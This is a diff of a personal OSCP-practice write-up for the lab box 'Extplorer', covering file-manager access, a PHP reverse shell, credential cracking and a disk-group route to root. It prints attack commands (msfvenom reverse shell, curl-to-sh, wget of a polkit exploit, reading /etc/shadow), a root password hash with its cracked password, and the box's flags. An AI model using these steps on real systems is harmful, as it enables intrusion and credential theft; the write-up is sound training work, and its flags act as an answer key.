@@ -1,24 +1,50 @@
 ---
-Date: 2024-10-07
+Date: 2024-10-08
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
-Status: In progress
+Status: Complete
 IP: 192.168.137.16
-Writeup:
+Writeup: https://medium.com/@ardian.danny/oscp-practice-series-50-proving-grounds-extplorer-9aaa071b5989
 ---
 # Extplorer
+This was simultaneously the easiest and most frustrating box yet. Identifying and accessing `filemanager` was ridiculously easy, and uploading a reverse shell php and catching the shell *seemed* easy initially. Even finding credentials for `dora` was easy once I started looking through all the info that was available in the `filemanager` folder. 
 
+What I wasn't expecting was to spend 2 hours trying to figure out why I couldn't upgrade the dumb shell I'd caught to a full shell, even though I ***knew*** the target was running `python3`. 
 
+Turns out that;
+1) **I didn't actually know what "Full TTY" really meant**. I went through endless walkthroughs explaining how to upgrade to "Full TTY" without realising that it meant a shell in an entirely new window. I just wanted a "full shell" eg. a minor upgrade from the dumb shell that would allow me to switch users and change directories. I didn't need something on the target that I could treat as an entirely separate tab and do things like "Ctrl+C" on without breaking the shell.
+   
+2) **MSFVenom doesn't produce good PHP reverse shells!!!** This was only discovered after spending ***WAY*** too much time looking for an explanation on why `python3 -c "import pty; pty.spawn('/bin/bash')"` (or any subtle variation of it) wasn't upgrading the dumb shell I'd caught. As soon as I found a comment in some buried StackOverflow thread about avoiding MSFVenom when creating PHP reverse shells, I created a new PHP file with the Ivan Sincek reverse shell from [revshells.com](https://www.revshells.com/), uploaded & executed it, then got a full shell the moment I tried to upgrade it. 
+
+All that frustration aside, the Priv Esc phase was a lot more straightforward and *very* educational. Besides staring in rage at the step telling me to use `python3` to upgrade my shell, I'd barely touched the walkthrough for any guidance on how to progress with this box. But when `LinPeas` only offered 1) an exploit that couldn't be executed because of missing dependencies, and 2) highlighted "user is part of `drive` group"; I needed to reference the walkthrough to figure out how to use `disk` group privilege to read sensitive details and ID a way to escalate to `root` (eg. reading the `shadow` and cracking the hash on `root`). Using `df -h` and `debugfs` was really cool, so I'll absolutely keep an eye out for that escalation vector in future.
 # Resolution summary
-- Text
-- Text
+- Nmap scan to identify ports `22` & `80`
+- Gobuster scan to identify `filemanager`
+- Password guessed to access `filemanager` Admin panel
+- Identified password hash for `dora` in config file
+- Cracked `dora` hash with `john`
+- Uploaded php reverse shell to `filemanager`
+- Caught reverse shell by navigating to uploaded php file
+- Switched to user `dora` with cracked password, printed `local.txt`
+- Ran `Linpeas.sh` and identified `dora` user is member of `disk` group
+- Used `df -h` to identify disk partition with OS
+- Used `disk` group privileges to print `proof.txt`
+- Used `disk` group privileges to print `/etc/shadow` 
+- Retrieved password hash for `root` & cracked hash for password
+- Switched to user `root` with cracked password, printed `proof.txt`
 ## Improved skills
-- skill 1
-- skill 2
+- Creating reverse shells with revshells.com
+- Upgrading from basic to full shell
 ## Used tools
 - nmap
 - gobuster
+- MSFVenom
+- revshells.com
+- LinPeas.sh
+- john
+- df
+- debugfs
 
 ---
 # Information Gathering
@@ -65,32 +91,59 @@ No enumeration conducted
 ![[Pasted image 20241007203309.png]]
 - Ran `john` against password hash for `dora` and found credential `dora:doraemon`
 ![[Pasted image 20241007203751.png]]
-
 ---
 # Exploitation
 ## Name of the technique
 - Identified option to upload files to Admin dashboard
 ![[Pasted image 20241007202007.png]]
-- Created PHP reverse shell file with MSFVenom: `msfvenom -p php/reverse_php LHOST=192.168.45.160 LPORT=4444 -o shell.php`
-- Attempted to navigate to `192.168.137.16/filemanager/shell.php` and caught reverse shell
-- ![[Pasted image 20241007225053.png]]
+- Created PHP reverse shell file with `revshells.com` and saved file as `shell2.php`
+![[Pasted image 20241008161714.png]]
+- Uploaded `shell2.php`, attempted to navigate to `192.168.137.16/filemanager/shell2.php` and caught reverse shell
+![[Pasted image 20241008161857.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
-
-
-## Lateral Movement vector
-
-
+- Upgraded to full shell, switched user with credentials `dora:doraemon`, then upgraded to full shell again
+![[Pasted image 20241008162333.png]]
+- Navigated to `/home/dora` and printed file `local.txt`
+![[Pasted image 20241008162600.png]]
+- Ran `cat /etc/passwd` to identify any other users & `cat /etc/shadow` to check access
+![[Pasted image 20241008162827.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
+- Ran `sudo -l` to check sudo privileges for `dora`
+![[Pasted image 20241008162910.png]]
+- Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download and execute `LinPeas`
+![[Pasted image 20241008163706.png]]
+- Identified by `LinPeas` as vulnerable to [CVE-2021-3560](https://github.com/UNICORDev/exploit-CVE-2021-3560)
+![[Pasted image 20241008163811.png]]
+	- CVE-2021-3560 can be used to bypass polkitd credentials checks to elevate a user to `root`
+- Identified user `dora` is part of `disk` group
+![[Pasted image 20241008170025.png]]
+	- Also ran `- find /dev -group disk` to check partitions owned by `disk`
+		![[Pasted image 20241008170348.png]]
+- Identified ssh config file
+![[Pasted image 20241008164637.png]]
+- Identified interesting files modified in last 5 mins
+![[Pasted image 20241008164753.png]]
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
+- Ran `wget https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2021-3560/refs/heads/main/exploit-CVE-2021-3560.py` to copy exploit onto target
+![[Pasted image 20241008165101.png]]
+- Ran `python3 exploit-CVE-2021-3560.py -u offsec -p pass` to attempt exploit creating user with credentials `offsec:pass`, then failed to install exploit dependency `gnome-control-center`
+![[Pasted image 20241008165258.png]]
+- Ignored further investigation of `CVE-2021-3560`, and attempted escalation through `dora` user being member of `disk` group.
+- Ran `df -h` to identify available partitions, and identified `/dev/mapper/ubuntu--vg-ubuntu--lv` as likely partition for Ubuntu OS
+![[Pasted image 20241008171429.png]]
+- Navigated to `/root` and printed `/root/proof.txt`
+![[Pasted image 20241008171715.png]]
+- Ran `cat /etc/shadow` to print password hashes
+![[Pasted image 20241008172041.png]]
+- Copied `root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::` into file and cracked hash with `john` for password `explorer`
+![[Pasted image 20241008172247.png]]
+- Ran `su root` to switch to `root` user with password `explorer`, and ran `ifconfig` to confirm IP address
+![[Pasted image 20241008172618.png]]
 ---
 # Trophy & Loot
-`local.txt` = ` `
-`root.txt` = ` `
+`local.txt` = `3e1616c5b86c3e113681958a619f6794`
+`root.txt` = `61b257ef0bcf2110b8c0622b32238ae9`
